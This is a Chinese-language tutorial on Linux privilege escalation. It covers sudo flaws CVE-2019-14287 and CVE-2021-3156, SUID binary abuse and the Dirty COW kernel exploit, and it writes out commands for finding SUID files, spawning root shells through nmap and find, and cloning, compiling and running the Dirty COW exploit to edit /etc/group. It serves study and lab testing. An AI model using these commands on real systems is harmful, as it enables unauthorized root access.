sudo提权

sudo简介

sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如docker *，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。简单介绍下sudo的特性：

  • sudo能够限制用户只在某台主机上运行某些命令。
  • sudo提供了丰富的日志，详细地记录了每个用户干了什么。
  • 当用户调用sudo并且输入它的密码时，用户获得了五分钟使用其他身份的能力
  • sudo的配置文件是sudoers文件，默认位置为/etc/sudoers，属性必须为0440。
**sudoers配置文件**：授权用户/组 主机=[切换到哪些用户或组]  [是否需要输入密码验证] 命令1,命令2

在linux中关于sudo目前涉及到两个漏洞均可以进行提权。一个是CVE-2019-14287，一个是CVE-2021-3156。

CVE-2019-14287

简介

该漏洞是一个sudo安全策略绕过问题，可导致恶意用户或程序在目标 Linux 系统上以 root 身份执行任意命令，需要特殊的配置才能触发，在默认的Linux中并不会存在该安全问题。此漏洞中sudo 将用户 ID 转换为用户名的函数会将 -1（或无效等效的 4294967295）误认为是 0，而这正好是 root 用户 User ID

受影响的版本

Sudo版本 < 1.8.28

环境搭建：

CentOS Linux release 7.0.1406

sudo版本：1.8.21p2

漏洞利用

1、首先创建一个新用户test，此时的test直接执行sudo失败，显示不在sudoers文件中。

2、root用户写入之前认为安全的配置文件test ALL= (ALL, !root) ALL，该配置意为：test用户可以使用除root身份以外的身份运行命令。

3、此时切换test用户，直接运行sudo vi 发现

4、使用sudo -u#-1 vi或sudo -u#4294967295 vi发现成功，可以打开passwd、shadow等文件

cve-2021-3156

简介

CVE-2021-3156（该漏洞被命名为“Baron Samedit”）——sudo在处理单个反斜杠结尾的命令时，发生逻辑错误，导致堆溢出。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。

受影响版本

sudo: 1.8.2 - 1.8.31p2
sudo: 1.9.0 - 1.9.5p1 （默认配置）

环境搭建

ubtutu 18.04 sudo 1.8.21p2

漏洞利用

1、首先查看是否存在该漏洞，命令行输入sudoedit -s /，如果响应一个以sudoedit:开头的报错，那么表明存在漏洞；如果响应一个以usage:开头的报错，那么表明补丁已经生效。

2、利用exp进行提权。

suid提权

简介

当程序运行需要高权限，但是用户不具备高权限时，这时则可以给文件设置SUID，使得用户在执行文件时将以文件所有者的权限来运行文件，而不是运行者本身权限。例如ping

漏洞利用

1、首先通过以下命令在主机上寻找符合提权条件的程序：一般都有：一般有以下 ：nmap vim find bash more less 

find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

2、找到后，可以利用其提权。例如：

nmap

nmap --interactive!sh

find

find . -type f -exec /bin/bash \;

内核漏洞

简介

脏牛漏洞(CVE-2016–5195)，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞，在2016年10月18后才得以修复，因此影响范围很大。该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。

漏洞环境

ububtu：14.04

Linux kernel >= 2.6.22

漏洞利用

1、先将exp拉下来，并且安装编译环境

git clone https://github.com/dirtycow/dirtycow.github.io

2、编译exp

gcc dirtyc0w.c -o dirtycow lpthread

3、运行exp

./dirtycow /etc/group “$(sed ‘/\(sudo*\)/ s/$/,test/’ /etc/group)”

新打开一个终端，使用test用户时发现test用户已经拥有了sudo权限，运行命令sudo su输入test密码就可以切换到root。
